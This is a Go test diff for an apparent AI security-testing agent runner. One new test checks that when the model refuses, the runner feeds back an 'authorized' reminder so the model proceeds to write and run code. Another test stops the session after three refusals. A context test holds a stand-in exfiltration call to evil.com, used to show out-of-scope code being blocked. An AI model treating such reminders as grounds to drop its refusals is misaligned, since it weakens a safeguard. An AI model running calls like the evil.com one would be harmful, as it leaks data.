@@ -158,6 +158,55 @@ func TestRunnerInjectsSkillCatalogIntoSystemPrompt(t *testing.T) {
 	}
 }
 
+func TestRunnerRecoversFromRefusalThenProceeds(t *testing.T) {
+	client := &scriptedClient{responses: []agent.Response{
+		{Content: "I can't help with that."},
+		{Content: "```python\nimport os\nprint('probe')\n```"},
+		{Content: "TASK_COMPLETE"},
+	}}
+	executor := &recordingExecutor{results: []ExecutionResult{{Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionSucceeded, Stdout: "probe\n"}}}
+	runner := NewRunner(client, executor, defaultRunnerConfig(), nil, nil)
+	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())
+
+	if err := runner.Run(context.Background(), session); err != nil {
+		t.Fatal(err)
+	}
+	if session.Status != SessionDone {
+		t.Fatalf("session = %+v", session)
+	}
+	recovered := false
+	for _, event := range session.Timeline {
+		if event.Kind == "recovery" && event.Detail == "refusal_recovery" {
+			recovered = true
+		}
+	}
+	if !recovered {
+		t.Fatalf("expected refusal_recovery event: %+v", session.Timeline)
+	}
+	if !containsMessageFragment(client.requests[1].Messages, "user", "authorized") {
+		t.Fatalf("authorization reminder not fed back: %+v", client.requests[1].Messages)
+	}
+}
+
+func TestRunnerStopsAfterRefusalLimit(t *testing.T) {
+	client := &scriptedClient{responses: []agent.Response{
+		{Content: "I can't help with that."},
+		{Content: "I'm unable to assist."},
+		{Content: "I must decline this request."},
+	}}
+	config := defaultRunnerConfig()
+	config.RefusalLimit = 3
+	runner := NewRunner(client, &recordingExecutor{}, config, nil, nil)
+	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())
+
+	if err := runner.Run(context.Background(), session); err != nil {
+		t.Fatal(err)
+	}
+	if session.Status != SessionFailed || session.StopReason != "refused" {
+		t.Fatalf("session = %+v", session)
+	}
+}
+
 func TestRunnerBlocksOutOfScopeCodeBeforeExecution(t *testing.T) {
 	client := &scriptedClient{responses: []agent.Response{
 		{Content: "外联测试。\n```python\nimport requests\nrequests.get('https://evil.com/steal')\n```"},
